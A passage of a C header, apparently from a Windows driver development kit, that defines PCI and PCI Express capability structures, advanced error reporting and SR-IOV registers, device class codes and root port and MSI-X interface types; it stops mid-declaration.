#define PCI_WHICHSPACE_CONFIG             0x0
#define PCI_WHICHSPACE_ROM                0x52696350 /* 'PciR' */

#define PCI_CAPABILITY_ID_POWER_MANAGEMENT  0x01
#define PCI_CAPABILITY_ID_AGP               0x02
#define PCI_CAPABILITY_ID_VPD               0x03
#define PCI_CAPABILITY_ID_SLOT_ID           0x04
#define PCI_CAPABILITY_ID_MSI               0x05
#define PCI_CAPABILITY_ID_CPCI_HOTSWAP      0x06
#define PCI_CAPABILITY_ID_PCIX              0x07
#define PCI_CAPABILITY_ID_HYPERTRANSPORT    0x08
#define PCI_CAPABILITY_ID_VENDOR_SPECIFIC   0x09
#define PCI_CAPABILITY_ID_DEBUG_PORT        0x0A
#define PCI_CAPABILITY_ID_CPCI_RES_CTRL     0x0B
#define PCI_CAPABILITY_ID_SHPC              0x0C
#define PCI_CAPABILITY_ID_P2P_SSID          0x0D
#define PCI_CAPABILITY_ID_AGP_TARGET        0x0E
#define PCI_CAPABILITY_ID_SECURE            0x0F
#define PCI_CAPABILITY_ID_PCI_EXPRESS       0x10
#define PCI_CAPABILITY_ID_MSIX              0x11

typedef struct _PCI_CAPABILITIES_HEADER {
  UCHAR CapabilityID;
  UCHAR Next;
} PCI_CAPABILITIES_HEADER, *PPCI_CAPABILITIES_HEADER;

typedef struct _PCI_PMC {
  UCHAR Version:3;
  UCHAR PMEClock:1;
  UCHAR Rsvd1:1;
  UCHAR DeviceSpecificInitialization:1;
  UCHAR Rsvd2:2;
  struct _PM_SUPPORT {
    UCHAR Rsvd2:1;
    UCHAR D1:1;
    UCHAR D2:1;
    UCHAR PMED0:1;
    UCHAR PMED1:1;
    UCHAR PMED2:1;
    UCHAR PMED3Hot:1;
    UCHAR PMED3Cold:1;
  } Support;
} PCI_PMC, *PPCI_PMC;

typedef struct _PCI_PMCSR {
  USHORT PowerState:2;
  USHORT Rsvd1:6;
  USHORT PMEEnable:1;
  USHORT DataSelect:4;
  USHORT DataScale:2;
  USHORT PMEStatus:1;
} PCI_PMCSR, *PPCI_PMCSR;

typedef struct _PCI_PMCSR_BSE {
  UCHAR Rsvd1:6;
  UCHAR D3HotSupportsStopClock:1;
  UCHAR BusPowerClockControlEnabled:1;
} PCI_PMCSR_BSE, *PPCI_PMCSR_BSE;

typedef struct _PCI_PM_CAPABILITY {
  PCI_CAPABILITIES_HEADER Header;
  union {
    PCI_PMC Capabilities;
    USHORT AsUSHORT;
  } PMC;
    union {
      PCI_PMCSR ControlStatus;
      USHORT AsUSHORT;
    } PMCSR;
    union {
      PCI_PMCSR_BSE BridgeSupport;
      UCHAR AsUCHAR;
    } PMCSR_BSE;
  UCHAR Data;
} PCI_PM_CAPABILITY, *PPCI_PM_CAPABILITY;

typedef struct {
  PCI_CAPABILITIES_HEADER Header;
  union {
    struct {
      USHORT DataParityErrorRecoveryEnable:1;
      USHORT EnableRelaxedOrdering:1;
      USHORT MaxMemoryReadByteCount:2;
      USHORT MaxOutstandingSplitTransactions:3;
      USHORT Reserved:9;
    } bits;
    USHORT AsUSHORT;
  } Command;
  union {
    struct {
      ULONG FunctionNumber:3;
      ULONG DeviceNumber:5;
      ULONG BusNumber:8;
      ULONG Device64Bit:1;
      ULONG Capable133MHz:1;
      ULONG SplitCompletionDiscarded:1;
      ULONG UnexpectedSplitCompletion:1;
      ULONG DeviceComplexity:1;
      ULONG DesignedMaxMemoryReadByteCount:2;
      ULONG DesignedMaxOutstandingSplitTransactions:3;
      ULONG DesignedMaxCumulativeReadSize:3;
      ULONG ReceivedSplitCompletionErrorMessage:1;
      ULONG CapablePCIX266:1;
      ULONG CapablePCIX533:1;
      } bits;
    ULONG AsULONG;
  } Status;
} PCI_X_CAPABILITY, *PPCI_X_CAPABILITY;

#define PCI_EXPRESS_ADVANCED_ERROR_REPORTING_CAP_ID                     0x0001
#define PCI_EXPRESS_VIRTUAL_CHANNEL_CAP_ID                              0x0002
#define PCI_EXPRESS_DEVICE_SERIAL_NUMBER_CAP_ID                         0x0003
#define PCI_EXPRESS_POWER_BUDGETING_CAP_ID                              0x0004
#define PCI_EXPRESS_RC_LINK_DECLARATION_CAP_ID                          0x0005
#define PCI_EXPRESS_RC_INTERNAL_LINK_CONTROL_CAP_ID                     0x0006
#define PCI_EXPRESS_RC_EVENT_COLLECTOR_ENDPOINT_ASSOCIATION_CAP_ID      0x0007
#define PCI_EXPRESS_MFVC_CAP_ID                                         0x0008
#define PCI_EXPRESS_VC_AND_MFVC_CAP_ID                                  0x0009
#define PCI_EXPRESS_RCRB_HEADER_CAP_ID                                  0x000A
#define PCI_EXPRESS_SINGLE_ROOT_IO_VIRTUALIZATION_CAP_ID                0x0010

typedef struct _PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER {
  USHORT CapabilityID;
  USHORT Version:4;
  USHORT Next:12;
} PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER, *PPCI_EXPRESS_ENHANCED_CAPABILITY_HEADER;

typedef struct _PCI_EXPRESS_SERIAL_NUMBER_CAPABILITY {
  PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER Header;
  ULONG LowSerialNumber;
  ULONG HighSerialNumber;
} PCI_EXPRESS_SERIAL_NUMBER_CAPABILITY, *PPCI_EXPRESS_SERIAL_NUMBER_CAPABILITY;

typedef union _PCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS {
  _ANONYMOUS_STRUCT struct {
    ULONG Undefined:1;
    ULONG Reserved1:3;
    ULONG DataLinkProtocolError:1;
    ULONG SurpriseDownError:1;
    ULONG Reserved2:6;
    ULONG PoisonedTLP:1;
    ULONG FlowControlProtocolError:1;
    ULONG CompletionTimeout:1;
    ULONG CompleterAbort:1;
    ULONG UnexpectedCompletion:1;
    ULONG ReceiverOverflow:1;
    ULONG MalformedTLP:1;
    ULONG ECRCError:1;
    ULONG UnsupportedRequestError:1;
    ULONG Reserved3:11;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS, *PPCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS;

typedef union _PCI_EXPRESS_UNCORRECTABLE_ERROR_MASK {
  _ANONYMOUS_STRUCT struct {
    ULONG Undefined:1;
    ULONG Reserved1:3;
    ULONG DataLinkProtocolError:1;
    ULONG SurpriseDownError:1;
    ULONG Reserved2:6;
    ULONG PoisonedTLP:1;
    ULONG FlowControlProtocolError:1;
    ULONG CompletionTimeout:1;
    ULONG CompleterAbort:1;
    ULONG UnexpectedCompletion:1;
    ULONG ReceiverOverflow:1;
    ULONG MalformedTLP:1;
    ULONG ECRCError:1;
    ULONG UnsupportedRequestError:1;
    ULONG Reserved3:11;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_UNCORRECTABLE_ERROR_MASK, *PPCI_EXPRESS_UNCORRECTABLE_ERROR_MASK;

typedef union _PCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY {
  _ANONYMOUS_STRUCT struct {
    ULONG Undefined:1;
    ULONG Reserved1:3;
    ULONG DataLinkProtocolError:1;
    ULONG SurpriseDownError:1;
    ULONG Reserved2:6;
    ULONG PoisonedTLP:1;
    ULONG FlowControlProtocolError:1;
    ULONG CompletionTimeout:1;
    ULONG CompleterAbort:1;
    ULONG UnexpectedCompletion:1;
    ULONG ReceiverOverflow:1;
    ULONG MalformedTLP:1;
    ULONG ECRCError:1;
    ULONG UnsupportedRequestError:1;
    ULONG Reserved3:11;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY, *PPCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY;

typedef union _PCI_EXPRESS_CORRECTABLE_ERROR_STATUS {
  _ANONYMOUS_STRUCT struct {
    ULONG ReceiverError:1;
    ULONG Reserved1:5;
    ULONG BadTLP:1;
    ULONG BadDLLP:1;
    ULONG ReplayNumRollover:1;
    ULONG Reserved2:3;
    ULONG ReplayTimerTimeout:1;
    ULONG AdvisoryNonFatalError:1;
    ULONG Reserved3:18;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_CORRECTABLE_ERROR_STATUS, *PPCI_CORRECTABLE_ERROR_STATUS;

typedef union _PCI_EXPRESS_CORRECTABLE_ERROR_MASK {
  _ANONYMOUS_STRUCT struct {
    ULONG ReceiverError:1;
    ULONG Reserved1:5;
    ULONG BadTLP:1;
    ULONG BadDLLP:1;
    ULONG ReplayNumRollover:1;
    ULONG Reserved2:3;
    ULONG ReplayTimerTimeout:1;
    ULONG AdvisoryNonFatalError:1;
    ULONG Reserved3:18;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_CORRECTABLE_ERROR_MASK, *PPCI_CORRECTABLE_ERROR_MASK;

typedef union _PCI_EXPRESS_AER_CAPABILITIES {
  _ANONYMOUS_STRUCT struct {
    ULONG FirstErrorPointer:5;
    ULONG ECRCGenerationCapable:1;
    ULONG ECRCGenerationEnable:1;
    ULONG ECRCCheckCapable:1;
    ULONG ECRCCheckEnable:1;
    ULONG Reserved:23;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_AER_CAPABILITIES, *PPCI_EXPRESS_AER_CAPABILITIES;

typedef union _PCI_EXPRESS_ROOT_ERROR_COMMAND {
  _ANONYMOUS_STRUCT struct {
    ULONG CorrectableErrorReportingEnable:1;
    ULONG NonFatalErrorReportingEnable:1;
    ULONG FatalErrorReportingEnable:1;
    ULONG Reserved:29;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_ROOT_ERROR_COMMAND, *PPCI_EXPRESS_ROOT_ERROR_COMMAND;

typedef union _PCI_EXPRESS_ROOT_ERROR_STATUS {
  _ANONYMOUS_STRUCT struct {
    ULONG CorrectableErrorReceived:1;
    ULONG MultipleCorrectableErrorsReceived:1;
    ULONG UncorrectableErrorReceived:1;
    ULONG MultipleUncorrectableErrorsReceived:1;
    ULONG FirstUncorrectableFatal:1;
    ULONG NonFatalErrorMessagesReceived:1;
    ULONG FatalErrorMessagesReceived:1;
    ULONG Reserved:20;
    ULONG AdvancedErrorInterruptMessageNumber:5;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_ROOT_ERROR_STATUS, *PPCI_EXPRESS_ROOT_ERROR_STATUS;

typedef union _PCI_EXPRESS_ERROR_SOURCE_ID {
  _ANONYMOUS_STRUCT struct {
    USHORT CorrectableSourceIdFun:3;
    USHORT CorrectableSourceIdDev:5;
    USHORT CorrectableSourceIdBus:8;
    USHORT UncorrectableSourceIdFun:3;
    USHORT UncorrectableSourceIdDev:5;
    USHORT UncorrectableSourceIdBus:8;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_ERROR_SOURCE_ID, *PPCI_EXPRESS_ERROR_SOURCE_ID;

typedef union _PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_STATUS {
  _ANONYMOUS_STRUCT struct {
    ULONG TargetAbortOnSplitCompletion:1;
    ULONG MasterAbortOnSplitCompletion:1;
    ULONG ReceivedTargetAbort:1;
    ULONG ReceivedMasterAbort:1;
    ULONG RsvdZ:1;
    ULONG UnexpectedSplitCompletionError:1;
    ULONG UncorrectableSplitCompletion:1;
    ULONG UncorrectableDataError:1;
    ULONG UncorrectableAttributeError:1;
    ULONG UncorrectableAddressError:1;
    ULONG DelayedTransactionDiscardTimerExpired:1;
    ULONG PERRAsserted:1;
    ULONG SERRAsserted:1;
    ULONG InternalBridgeError:1;
    ULONG Reserved:18;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_STATUS, *PPCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_STATUS;

typedef union _PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_MASK {
  _ANONYMOUS_STRUCT struct {
    ULONG TargetAbortOnSplitCompletion:1;
    ULONG MasterAbortOnSplitCompletion:1;
    ULONG ReceivedTargetAbort:1;
    ULONG ReceivedMasterAbort:1;
    ULONG RsvdZ:1;
    ULONG UnexpectedSplitCompletionError:1;
    ULONG UncorrectableSplitCompletion:1;
    ULONG UncorrectableDataError:1;
    ULONG UncorrectableAttributeError:1;
    ULONG UncorrectableAddressError:1;
    ULONG DelayedTransactionDiscardTimerExpired:1;
    ULONG PERRAsserted:1;
    ULONG SERRAsserted:1;
    ULONG InternalBridgeError:1;
    ULONG Reserved:18;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_MASK, *PPCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_MASK;

typedef union _PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_SEVERITY {
  _ANONYMOUS_STRUCT struct {
    ULONG TargetAbortOnSplitCompletion:1;
    ULONG MasterAbortOnSplitCompletion:1;
    ULONG ReceivedTargetAbort:1;
    ULONG ReceivedMasterAbort:1;
    ULONG RsvdZ:1;
    ULONG UnexpectedSplitCompletionError:1;
    ULONG UncorrectableSplitCompletion:1;
    ULONG UncorrectableDataError:1;
    ULONG UncorrectableAttributeError:1;
    ULONG UncorrectableAddressError:1;
    ULONG DelayedTransactionDiscardTimerExpired:1;
    ULONG PERRAsserted:1;
    ULONG SERRAsserted:1;
    ULONG InternalBridgeError:1;
    ULONG Reserved:18;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_SEVERITY, *PPCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_SEVERITY;

typedef union _PCI_EXPRESS_SEC_AER_CAPABILITIES {
  _ANONYMOUS_STRUCT struct {
    ULONG SecondaryUncorrectableFirstErrorPtr:5;
    ULONG Reserved:27;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SEC_AER_CAPABILITIES, *PPCI_EXPRESS_SEC_AER_CAPABILITIES;

#define ROOT_CMD_ENABLE_CORRECTABLE_ERROR_REPORTING  0x00000001
#define ROOT_CMD_ENABLE_NONFATAL_ERROR_REPORTING     0x00000002
#define ROOT_CMD_ENABLE_FATAL_ERROR_REPORTING        0x00000004

#define ROOT_CMD_ERROR_REPORTING_ENABLE_MASK \
    (ROOT_CMD_ENABLE_FATAL_ERROR_REPORTING | \
     ROOT_CMD_ENABLE_NONFATAL_ERROR_REPORTING | \
     ROOT_CMD_ENABLE_CORRECTABLE_ERROR_REPORTING)

typedef struct _PCI_EXPRESS_AER_CAPABILITY {
  PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER Header;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS UncorrectableErrorStatus;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_MASK UncorrectableErrorMask;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY UncorrectableErrorSeverity;
  PCI_EXPRESS_CORRECTABLE_ERROR_STATUS CorrectableErrorStatus;
  PCI_EXPRESS_CORRECTABLE_ERROR_MASK CorrectableErrorMask;
  PCI_EXPRESS_AER_CAPABILITIES CapabilitiesAndControl;
  ULONG HeaderLog[4];
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_STATUS SecUncorrectableErrorStatus;
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_MASK SecUncorrectableErrorMask;
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_SEVERITY SecUncorrectableErrorSeverity;
  PCI_EXPRESS_SEC_AER_CAPABILITIES SecCapabilitiesAndControl;
  ULONG SecHeaderLog[4];
} PCI_EXPRESS_AER_CAPABILITY, *PPCI_EXPRESS_AER_CAPABILITY;

typedef struct _PCI_EXPRESS_ROOTPORT_AER_CAPABILITY {
  PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER Header;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS UncorrectableErrorStatus;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_MASK UncorrectableErrorMask;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY UncorrectableErrorSeverity;
  PCI_EXPRESS_CORRECTABLE_ERROR_STATUS CorrectableErrorStatus;
  PCI_EXPRESS_CORRECTABLE_ERROR_MASK CorrectableErrorMask;
  PCI_EXPRESS_AER_CAPABILITIES CapabilitiesAndControl;
  ULONG HeaderLog[4];
  PCI_EXPRESS_ROOT_ERROR_COMMAND RootErrorCommand;
  PCI_EXPRESS_ROOT_ERROR_STATUS RootErrorStatus;
  PCI_EXPRESS_ERROR_SOURCE_ID ErrorSourceId;
} PCI_EXPRESS_ROOTPORT_AER_CAPABILITY, *PPCI_EXPRESS_ROOTPORT_AER_CAPABILITY;

typedef struct _PCI_EXPRESS_BRIDGE_AER_CAPABILITY {
  PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER Header;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_STATUS UncorrectableErrorStatus;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_MASK UncorrectableErrorMask;
  PCI_EXPRESS_UNCORRECTABLE_ERROR_SEVERITY UncorrectableErrorSeverity;
  PCI_EXPRESS_CORRECTABLE_ERROR_STATUS CorrectableErrorStatus;
  PCI_EXPRESS_CORRECTABLE_ERROR_MASK CorrectableErrorMask;
  PCI_EXPRESS_AER_CAPABILITIES CapabilitiesAndControl;
  ULONG HeaderLog[4];
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_STATUS SecUncorrectableErrorStatus;
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_MASK SecUncorrectableErrorMask;
  PCI_EXPRESS_SEC_UNCORRECTABLE_ERROR_SEVERITY SecUncorrectableErrorSeverity;
  PCI_EXPRESS_SEC_AER_CAPABILITIES SecCapabilitiesAndControl;
  ULONG SecHeaderLog[4];
} PCI_EXPRESS_BRIDGE_AER_CAPABILITY, *PPCI_EXPRESS_BRIDGE_AER_CAPABILITY;

typedef union _PCI_EXPRESS_SRIOV_CAPS {
  _ANONYMOUS_STRUCT struct {
    ULONG VFMigrationCapable:1;
    ULONG Reserved1:20;
    ULONG VFMigrationInterruptNumber:11;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SRIOV_CAPS, *PPCI_EXPRESS_SRIOV_CAPS;

typedef union _PCI_EXPRESS_SRIOV_CONTROL {
  _ANONYMOUS_STRUCT struct {
    USHORT VFEnable:1;
    USHORT VFMigrationEnable:1;
    USHORT VFMigrationInterruptEnable:1;
    USHORT VFMemorySpaceEnable:1;
    USHORT ARICapableHierarchy:1;
    USHORT Reserved1:11;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_SRIOV_CONTROL, *PPCI_EXPRESS_SRIOV_CONTROL;

typedef union _PCI_EXPRESS_SRIOV_STATUS {
  _ANONYMOUS_STRUCT struct {
    USHORT VFMigrationStatus:1;
    USHORT Reserved1:15;
  } DUMMYSTRUCTNAME;
  USHORT AsUSHORT;
} PCI_EXPRESS_SRIOV_STATUS, *PPCI_EXPRESS_SRIOV_STATUS;

typedef union _PCI_EXPRESS_SRIOV_MIGRATION_STATE_ARRAY {
  _ANONYMOUS_STRUCT struct {
    ULONG VFMigrationStateBIR:3;
    ULONG VFMigrationStateOffset:29;
  } DUMMYSTRUCTNAME;
  ULONG AsULONG;
} PCI_EXPRESS_SRIOV_MIGRATION_STATE_ARRAY, *PPCI_EXPRESS_SRIOV_MIGRATION_STATE_ARRAY;

typedef struct _PCI_EXPRESS_SRIOV_CAPABILITY {
  PCI_EXPRESS_ENHANCED_CAPABILITY_HEADER Header;
  PCI_EXPRESS_SRIOV_CAPS SRIOVCapabilities;
  PCI_EXPRESS_SRIOV_CONTROL SRIOVControl;
  PCI_EXPRESS_SRIOV_STATUS SRIOVStatus;
  USHORT InitialVFs;
  USHORT TotalVFs;
  USHORT NumVFs;
  UCHAR FunctionDependencyLink;
  UCHAR RsvdP1;
  USHORT FirstVFOffset;
  USHORT VFStride;
  USHORT RsvdP2;
  USHORT VFDeviceId;
  ULONG SupportedPageSizes;
  ULONG SystemPageSize;
  ULONG BaseAddresses[PCI_TYPE0_ADDRESSES];
  PCI_EXPRESS_SRIOV_MIGRATION_STATE_ARRAY VFMigrationStateArrayOffset;
} PCI_EXPRESS_SRIOV_CAPABILITY, *PPCI_EXPRESS_SRIOV_CAPABILITY;

/* PCI device classes */
#define PCI_CLASS_PRE_20                    0x00
#define PCI_CLASS_MASS_STORAGE_CTLR         0x01
#define PCI_CLASS_NETWORK_CTLR              0x02
#define PCI_CLASS_DISPLAY_CTLR              0x03
#define PCI_CLASS_MULTIMEDIA_DEV            0x04
#define PCI_CLASS_MEMORY_CTLR               0x05
#define PCI_CLASS_BRIDGE_DEV                0x06
#define PCI_CLASS_SIMPLE_COMMS_CTLR         0x07
#define PCI_CLASS_BASE_SYSTEM_DEV           0x08
#define PCI_CLASS_INPUT_DEV                 0x09
#define PCI_CLASS_DOCKING_STATION           0x0a
#define PCI_CLASS_PROCESSOR                 0x0b
#define PCI_CLASS_SERIAL_BUS_CTLR           0x0c
#define PCI_CLASS_WIRELESS_CTLR             0x0d
#define PCI_CLASS_INTELLIGENT_IO_CTLR       0x0e
#define PCI_CLASS_SATELLITE_COMMS_CTLR      0x0f
#define PCI_CLASS_ENCRYPTION_DECRYPTION     0x10
#define PCI_CLASS_DATA_ACQ_SIGNAL_PROC      0x11
#define PCI_CLASS_NOT_DEFINED               0xff

/* PCI device subclasses for class 0 */
#define PCI_SUBCLASS_PRE_20_NON_VGA         0x00
#define PCI_SUBCLASS_PRE_20_VGA             0x01

/* PCI device subclasses for class 1 (mass storage controllers)*/
#define PCI_SUBCLASS_MSC_SCSI_BUS_CTLR      0x00
#define PCI_SUBCLASS_MSC_IDE_CTLR           0x01
#define PCI_SUBCLASS_MSC_FLOPPY_CTLR        0x02
#define PCI_SUBCLASS_MSC_IPI_CTLR           0x03
#define PCI_SUBCLASS_MSC_RAID_CTLR          0x04
#define PCI_SUBCLASS_MSC_OTHER              0x80

/* PCI device subclasses for class 2 (network controllers)*/
#define PCI_SUBCLASS_NET_ETHERNET_CTLR      0x00
#define PCI_SUBCLASS_NET_TOKEN_RING_CTLR    0x01
#define PCI_SUBCLASS_NET_FDDI_CTLR          0x02
#define PCI_SUBCLASS_NET_ATM_CTLR           0x03
#define PCI_SUBCLASS_NET_ISDN_CTLR          0x04
#define PCI_SUBCLASS_NET_OTHER              0x80

/* PCI device subclasses for class 3 (display controllers)*/
#define PCI_SUBCLASS_VID_VGA_CTLR           0x00
#define PCI_SUBCLASS_VID_XGA_CTLR           0x01
#define PCI_SUBCLASS_VID_3D_CTLR            0x02
#define PCI_SUBCLASS_VID_OTHER              0x80

/* PCI device subclasses for class 4 (multimedia device)*/
#define PCI_SUBCLASS_MM_VIDEO_DEV           0x00
#define PCI_SUBCLASS_MM_AUDIO_DEV           0x01
#define PCI_SUBCLASS_MM_TELEPHONY_DEV       0x02
#define PCI_SUBCLASS_MM_OTHER               0x80

/* PCI device subclasses for class 5 (memory controller)*/
#define PCI_SUBCLASS_MEM_RAM                0x00
#define PCI_SUBCLASS_MEM_FLASH              0x01
#define PCI_SUBCLASS_MEM_OTHER              0x80

/* PCI device subclasses for class 6 (bridge device)*/
#define PCI_SUBCLASS_BR_HOST                0x00
#define PCI_SUBCLASS_BR_ISA                 0x01
#define PCI_SUBCLASS_BR_EISA                0x02
#define PCI_SUBCLASS_BR_MCA                 0x03
#define PCI_SUBCLASS_BR_PCI_TO_PCI          0x04
#define PCI_SUBCLASS_BR_PCMCIA              0x05
#define PCI_SUBCLASS_BR_NUBUS               0x06
#define PCI_SUBCLASS_BR_CARDBUS             0x07
#define PCI_SUBCLASS_BR_RACEWAY             0x08
#define PCI_SUBCLASS_BR_OTHER               0x80

#define PCI_SUBCLASS_COM_SERIAL             0x00
#define PCI_SUBCLASS_COM_PARALLEL           0x01
#define PCI_SUBCLASS_COM_MULTIPORT          0x02
#define PCI_SUBCLASS_COM_MODEM              0x03
#define PCI_SUBCLASS_COM_OTHER              0x80

#define PCI_SUBCLASS_SYS_INTERRUPT_CTLR     0x00
#define PCI_SUBCLASS_SYS_DMA_CTLR           0x01
#define PCI_SUBCLASS_SYS_SYSTEM_TIMER       0x02
#define PCI_SUBCLASS_SYS_REAL_TIME_CLOCK    0x03
#define PCI_SUBCLASS_SYS_GEN_HOTPLUG_CTLR   0x04
#define PCI_SUBCLASS_SYS_SDIO_CTRL          0x05
#define PCI_SUBCLASS_SYS_OTHER              0x80

#define PCI_SUBCLASS_INP_KEYBOARD           0x00
#define PCI_SUBCLASS_INP_DIGITIZER          0x01
#define PCI_SUBCLASS_INP_MOUSE              0x02
#define PCI_SUBCLASS_INP_SCANNER            0x03
#define PCI_SUBCLASS_INP_GAMEPORT           0x04
#define PCI_SUBCLASS_INP_OTHER              0x80

#define PCI_SUBCLASS_DOC_GENERIC            0x00
#define PCI_SUBCLASS_DOC_OTHER              0x80

#define PCI_SUBCLASS_PROC_386               0x00
#define PCI_SUBCLASS_PROC_486               0x01
#define PCI_SUBCLASS_PROC_PENTIUM           0x02
#define PCI_SUBCLASS_PROC_ALPHA             0x10
#define PCI_SUBCLASS_PROC_POWERPC           0x20
#define PCI_SUBCLASS_PROC_COPROCESSOR       0x40

/* PCI device subclasses for class C (serial bus controller)*/
#define PCI_SUBCLASS_SB_IEEE1394            0x00
#define PCI_SUBCLASS_SB_ACCESS              0x01
#define PCI_SUBCLASS_SB_SSA                 0x02
#define PCI_SUBCLASS_SB_USB                 0x03
#define PCI_SUBCLASS_SB_FIBRE_CHANNEL       0x04
#define PCI_SUBCLASS_SB_SMBUS               0x05

#define PCI_SUBCLASS_WIRELESS_IRDA          0x00
#define PCI_SUBCLASS_WIRELESS_CON_IR        0x01
#define PCI_SUBCLASS_WIRELESS_RF            0x10
#define PCI_SUBCLASS_WIRELESS_OTHER         0x80

#define PCI_SUBCLASS_INTIO_I2O              0x00

#define PCI_SUBCLASS_SAT_TV                 0x01
#define PCI_SUBCLASS_SAT_AUDIO              0x02
#define PCI_SUBCLASS_SAT_VOICE              0x03
#define PCI_SUBCLASS_SAT_DATA               0x04

#define PCI_SUBCLASS_CRYPTO_NET_COMP        0x00
#define PCI_SUBCLASS_CRYPTO_ENTERTAINMENT   0x10
#define PCI_SUBCLASS_CRYPTO_OTHER           0x80

#define PCI_SUBCLASS_DASP_DPIO              0x00
#define PCI_SUBCLASS_DASP_OTHER             0x80

#define PCI_ADDRESS_IO_SPACE                0x00000001
#define PCI_ADDRESS_MEMORY_TYPE_MASK        0x00000006
#define PCI_ADDRESS_MEMORY_PREFETCHABLE     0x00000008
#define PCI_ADDRESS_IO_ADDRESS_MASK         0xfffffffc
#define PCI_ADDRESS_MEMORY_ADDRESS_MASK     0xfffffff0
#define PCI_ADDRESS_ROM_ADDRESS_MASK        0xfffff800

#define PCI_TYPE_32BIT                      0
#define PCI_TYPE_20BIT                      2
#define PCI_TYPE_64BIT                      4

#define PCI_ROMADDRESS_ENABLED              0x00000001

#endif /* _PCI_X_ */

#define PCI_EXPRESS_LINK_QUIESCENT_INTERFACE_VERSION       1

typedef NTSTATUS
(NTAPI PCI_EXPRESS_ENTER_LINK_QUIESCENT_MODE)(
  IN OUT PVOID Context);
typedef PCI_EXPRESS_ENTER_LINK_QUIESCENT_MODE *PPCI_EXPRESS_ENTER_LINK_QUIESCENT_MODE;

typedef NTSTATUS
(NTAPI PCI_EXPRESS_EXIT_LINK_QUIESCENT_MODE)(
  IN OUT PVOID Context);
typedef PCI_EXPRESS_EXIT_LINK_QUIESCENT_MODE *PPCI_EXPRESS_EXIT_LINK_QUIESCENT_MODE;

typedef struct _PCI_EXPRESS_LINK_QUIESCENT_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PPCI_EXPRESS_ENTER_LINK_QUIESCENT_MODE PciExpressEnterLinkQuiescentMode;
  PPCI_EXPRESS_EXIT_LINK_QUIESCENT_MODE PciExpressExitLinkQuiescentMode;
} PCI_EXPRESS_LINK_QUIESCENT_INTERFACE, *PPCI_EXPRESS_LINK_QUIESCENT_INTERFACE;

#define PCI_EXPRESS_ROOT_PORT_INTERFACE_VERSION            1

typedef ULONG
(NTAPI *PPCI_EXPRESS_ROOT_PORT_READ_CONFIG_SPACE)(
  IN PVOID Context,
  OUT PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

typedef ULONG
(NTAPI *PPCI_EXPRESS_ROOT_PORT_WRITE_CONFIG_SPACE)(
  IN PVOID Context,
  IN PVOID Buffer,
  IN ULONG Offset,
  IN ULONG Length);

typedef struct _PCI_EXPRESS_ROOT_PORT_INTERFACE {
  USHORT Size;
  USHORT Version;
  PVOID Context;
  PINTERFACE_REFERENCE InterfaceReference;
  PINTERFACE_DEREFERENCE InterfaceDereference;
  PPCI_EXPRESS_ROOT_PORT_READ_CONFIG_SPACE ReadConfigSpace;
  PPCI_EXPRESS_ROOT_PORT_WRITE_CONFIG_SPACE WriteConfigSpace;
} PCI_EXPRESS_ROOT_PORT_INTERFACE, *PPCI_EXPRESS_ROOT_PORT_INTERFACE;

#define PCI_MSIX_TABLE_CONFIG_INTERFACE_VERSION            1

typedef NTSTATUS
(NTAPI PCI_MSIX_SET_ENTRY)(
  IN PVOID Context,
  IN ULONG TableEntry,
  IN ULONG MessageNumber);
typedef PCI_MSIX_SET_ENTRY *PPCI_MSIX_SET_ENTRY;

typedef NTSTATUS
(NTAPI PCI_MSIX_MASKUNMASK_ENTRY)(
